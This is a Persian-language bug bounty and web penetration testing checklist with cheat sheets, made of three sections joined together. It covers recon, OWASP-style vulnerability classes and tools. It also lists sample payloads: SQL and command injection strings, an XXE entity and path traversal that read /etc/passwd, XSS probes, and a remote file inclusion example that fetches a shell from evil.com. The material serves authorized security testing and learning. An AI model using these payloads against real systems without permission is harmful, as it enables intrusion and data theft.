# checklist bug bounty

برای پیشبرد پروژه تست نفوذ وب و تهیه گزارش کامل و حرفه‌ای، ترکیبی از چک‌لیست (Checklist) و برگه تقلب (Cheat Sheet) بسیار موثر است. در ادامه یک چک‌لیست جامع همراه با نکات کلیدی و برگه تقلب برای تست نفوذ وب ارائه می‌کنم که می‌توانید به عنوان راهنما و مرجع در طول تست استفاده کنید.

چک‌لیست جامع تست نفوذ وب (Checklist)
1. قبل از شروع تست نفوذ
تعیین دامنه و محدوده تست (Scope) 

تعیین نوع تست (Black-box, Gray-box, White-box) و دسترسی‌ها

دریافت مجوز قانونی و مستندات لازم

تعیین معیارهای موفقیت و اهداف تست

آماده‌سازی ابزارها و محیط تست (Burp Suite, Nmap, SQLMap و غیره)

2. جمع‌آوری اطلاعات (Reconnaissance)
کشف زیردامنه‌ها (Subdomain Discovery) با ابزارهایی مثل subfinder، Amass

شناسایی فناوری‌ها و CMS (مثلاً وردپرس، جوملا)

اسکن پورت‌ها و سرویس‌ها با Nmap

جمع‌آوری اطلاعات از فایل‌های robots.txt، sitemap.xml

بررسی رکوردهای DNS و WHOIS

3. شناسایی آسیب‌پذیری‌های رایج
تست SQL Injection با SQLMap و تست دستی

تست XSS (Reflected, Stored, DOM-based) با Burp Suite و فازی کردن ورودی‌ها

تست CSRF و بررسی توکن‌های امنیتی

تست Authentication و Authorization (شامل افزایش دسترسی، Account Takeover)

بررسی آسیب‌پذیری‌های File Upload و Remote Code Execution

تست Open Redirect و SSRF

بررسی آسیب‌پذیری‌های مربوط به Session و Cookie

تست امنیت APIها و Web Services (Authentication, Rate Limiting, JWT) 

بررسی تنظیمات امنیتی سرور و HTTP Headers (CSP, HSTS, X-Frame-Options)

4. تحلیل و بهره‌برداری (Exploitation)
استفاده از ابزارهای خودکار و تست‌های دستی برای بهره‌برداری از آسیب‌پذیری‌ها

ثبت دقیق مراحل و نتایج تست‌ها

بررسی امکان دسترسی غیرمجاز به داده‌ها یا سیستم‌ها

5. گزارش‌دهی و پیشنهادات
تهیه گزارش جامع شامل شرح آسیب‌پذیری‌ها، نحوه کشف، ریسک و راهکارهای رفع 

ارائه راهکارهای امنیتی و پیشنهادات بهینه‌سازی

مستندسازی تست‌ها و آماده‌سازی برای بازبینی

برگه تقلب (Cheat Sheet) مهم تست نفوذ وب
موضوع	نکات کلیدی و دستورات مهم	ابزار پیشنهادی
===>>> SQL Injection	تست پارامترهای GET/POST، استفاده از sqlmap -u URL	SQLMap, Burp Suite

===>>> XSS	تزریق <script>alert(1)</script>، تست Stored و Reflected	Burp Suite, OWASP ZAP

===>>> CSRF	حذف توکن CSRF، تغییر هدر Origin/Referer	Burp Suite Repeater

===>>> Authentication	تست Brute Force، بررسی MFA، افزایش دسترسی افقی/عمودی	Hydra, Burp Suite

===>>> Subdomain Discovery	subfinder -d example.com، جستجو در crt.sh	Subfinder, Amass

===>>> Directory/Files	استفاده از wordlist برای fuzzing دایرکتوری‌ها	Dirbuster, ffuf

===>>> HTTP Headers	بررسی وجود HSTS, CSP, X-Frame-Options	curl, Burp Suite

===>>> SSRF	تزریق آدرس‌های داخلی، استفاده از Burp Collaborator	Burp Suite, curl

===>>> Open Redirect	تست پارامترهای redirect، تغییر URL	Burp Suite

===>>> Session Management	بررسی HttpOnly, Secure، تست Session Fixation	Burp Suite, OWASP ZAP

===>>> API Security	تست Authentication، Rate Limiting، JWT	Postman, Burp Suite
نکات مهم برای موفقیت در تست نفوذ وب
ترکیب تست‌های خودکار و دستی برای پوشش کامل آسیب‌پذیری‌ها ضروری است .

مستندسازی دقیق هر مرحله به گزارش‌نویسی بهتر کمک می‌کند.

تمرکز بر فاز جمع‌آوری اطلاعات (Recon) که بخش عمده موفقیت تست را تضمین می‌کند .

آموزش و به‌روزرسانی مداوم با منابع فارسی و انگلیسی معتبر.

رعایت اخلاق حرفه‌ای و قانونی در تمام مراحل تست.

=========================================================================
=========================================================================


برای تهیه یک چک‌لیست جامع باگ‌بانتی (Bug Bounty) که بر اساس آسیب‌پذیری‌های رایج و تکنیک‌های مورد استفاده توسط هکرهای موفق طراحی شده باشد، می‌توانید از این لیست استفاده کنید. این چک‌لیست بر اساس تجربیات هکرهای برتر و آسیب‌پذیری‌های پردرآمد در برنامه‌های باگ‌بانتی تنظیم شده است:

چک‌لیست جامع باگ‌بانتی برای کشف آسیب‌پذیری‌های پردرآمد
۱. تزریق (Injection)
تزریق SQL (SQLi): تست پارامترهای GET/POST، هدرها و کوکی‌ها با ', ", OR 1=1--, UNION SELECT

تزریق NoSQL: تست در API‌های مبتنی بر MongoDB با {"$ne": ""}, {"$gt": ""}

تزریق فرمان (Command Injection): تست ورودی‌های سیستم با ;, &&, |, $(command)

تزریق XML (XXE): آپلود فایل‌های XML حاوی <!ENTITY xxe SYSTEM "file:///etc/passwd">

۲. احراز هویت و مدیریت نشست (Authentication & Session)
نقص در احراز هویت: تست Bypass لاگین با admin'--, admin' OR '1'='1'--

مسائل JWT: تست توکن‌های JWT با تغییر الگوریتم به none یا دستکاری کلیدها

نشست ثابت (Session Fixation): بررسی امکان استفاده از یک نشست ثابت برای کاربران دیگر

Brute Force: تست حمله Brute Force روی صفحات لاگین با ابزارهایی مانند Burp Intruder یا Hydra

۳. کنترل دسترسی (Access Control)
IDOR (Insecure Direct Object Reference): تغییر پارامترهای ID در URL (مثلاً /user?id=123 به id=124)

Bypass مسیرها (Path Traversal): تست ../../etc/passwd در پارامترهای فایل

CORS Misconfiguration: بررسی هدر Access-Control-Allow-Origin برای اجازه دسترسی از دامنه‌های غیرمجاز

۴. امنیت سمت کلاینت (Client-Side)
XSS (Cross-Site Scripting): تست <script>alert(1)</script>, <img src=x onerror=alert(1)>

DOM-based XSS: تست تغییر مقادیر در document.location.hash یا eval()

CSRF (Cross-Site Request Forgery): بررسی عدم وجود توکن CSRF در فرم‌های حساس

۵. مسائل امنیتی API
نقص در اعتبارسنجی API: تست Endpointهای بدون احراز هویت

محدود نبودن نرخ درخواست (Rate Limiting): تست ارسال درخواست‌های مکرر برای بررسی امکان DDoS یا Bruteforce

GraphQL Injection: تست Queryهای مخرب در GraphQL مانند {__schema{types{name}}}

۶. مسائل سرور و میزبان (Server-Side)
SSRF (Server-Side Request Forgery): تست URLهای داخلی مانند http://localhost/admin

RCE (Remote Code Execution): تست آپلود فایل‌های مخرب (مثلاً .php, .jsp)

LFI/RFI (Local/Remote File Inclusion): تست ?page=../../../etc/passwd یا ?page=http://evil.com/shell.txt

۷. مسائل منطق کسب‌وکار (Business Logic)
تغییر قیمت در سبد خرید: دستکاری مقدار price در درخواست‌های POST

سوءاستفاده از کوپن‌ها: تست کوپن‌های قابل حدس یا Brute Force

Race Condition: تست خرید همزمان با چند درخواست برای سوءاستفاده از محدودیت‌ها

۸. مسائل امنیتی مدرن
WebSockets: تست عدم اعتبارسنجی در ارتباطات WebSocket

Web Cache Poisoning: تست تغییر هدرهای X-Forwarded-Host برای Poison کش سرور

HTTP Request Smuggling: تست اختلاف در تفسیر هدرها بین فرانت‌اند و بک‌اند

ابزارهای پیشنهادی برای تست:
Burp Suite (برای تست دستکاری درخواست‌ها)

OWASP ZAP (اسکنر خودکار)

SQLmap (برای تست SQLi)

Nmap (برای اسکن پورت‌ها)

FFuf (برای فازینگ مسیرها)

Postman (برای تست API)

منابع یادگیری پیشنهادی:
PortSwigger Web Security Academy (رایگان)

HackerOne Hacktivity (گزارش‌های واقعی)

Bug Bounty Playbook (کتاب راهنمای باگ‌بانتی)

با دنبال کردن این چک‌لیست و تمرین مداوم، می‌توانید آسیب‌پذیری‌های پرخطری را کشف کنید که هکرهای موفق از آن‌ها برای کسب درآمد استفاده کرده‌اند. 🚀

==================================================================================
==================================================================================

چک‌لیست شکار باگ بانتی حرفه‌ای
۱. آماده‌سازی و اطلاعات اولیه
 جمع‌آوری اطلاعات هدف (Information Gathering)

 بررسی دامنه‌ها و ساب‌دامین‌ها با ابزار (مثلاً subfinder, amass)

 شناسایی ورژن‌ها و تکنولوژی‌های استفاده شده (مثلاً Wappalyzer، WhatWeb)

 اسکن پورت‌ها و سرویس‌ها (nmap)

 بررسی مستندات، APIها، فایل‌های robots.txt و sitemap.xml

۲. تست‌های اولیه (Recon & Fuzzing)
 پیدا کردن نقاط ورودی ورودی داده (input points) مثل فرم‌ها، پارامترهای GET/POST

 بررسی درخواست‌های API و ساختار JSON/XML

 فاز فاز fuzzing روی پارامترها (مثلاً wfuzz, ffuf)

 تست روش‌های مختلف HTTP (PUT, DELETE, TRACE)

۳. تست آسیب‌پذیری‌های رایج (OWASP Top 10)
 Injection (SQLi, NoSQLi, Command Injection)

 Cross-Site Scripting (XSS)

 Broken Authentication و Session Management

 Broken Access Control (IDOR, Privilege Escalation)

 Security Misconfiguration

 Sensitive Data Exposure

 XML External Entities (XXE)

 Insecure Deserialization

 Using Components with Known Vulnerabilities

 Insufficient Logging & Monitoring

۴. تست‌های پیشرفته
 بررسی Race Condition (همچنین در APIهای async)

 بررسی SSRF (Server-Side Request Forgery)

 بررسی Logic Flaws و Flow های اشتباه (مثلاً bypass کردن مراحل پرداخت)

 بررسی Broken Access Control پیشرفته (مثلاً Horizontal/Vertical IDOR)

 تست حملات Cache Poisoning

 بررسی آسیب‌پذیری‌های مربوط به Authentication Multi-Factor

 تست فایل آپلود (Upload Vulnerabilities) و RCE

۵. بررسی امنیت سمت کلاینت
 تست XSS در جاوااسکریپت و DOM-based XSS

 بررسی CSP (Content Security Policy) و ضعف‌های مربوط

 تست Cookieها (HttpOnly, Secure, SameSite)

 بررسی ذخیره‌سازی ناامن داده‌ها در LocalStorage/SessionStorage

۶. ابزارها و تکنیک‌ها
 استفاده از Burp Suite (Intruder, Repeater, Scanner)

 استفاده از OWASP ZAP

 ابزارهای خودکار مثل Nuclei, Nessus

 استفاده از Chrome DevTools برای تست و دیباگ

 استفاده از ابزارهای دیکدینگ و فازی تست

۷. نکات حرفه‌ای
 همیشه به دنبال باگ‌های کم‌تر شناخته‌شده باشید

 گزارش کامل و دقیق از باگ بنویسید (PoC و Steps to reproduce)

 از روش‌های chaining attack (ترکیب چند آسیب‌پذیری) استفاده کنید

 همیشه نسخه‌های مختلف API و اپلیکیشن را تست کنید

 زمان خود را به تست متنوع و عمیق اختصاص دهید، نه فقط تست خودکار

 =======================================================================
 =======================================================================

 
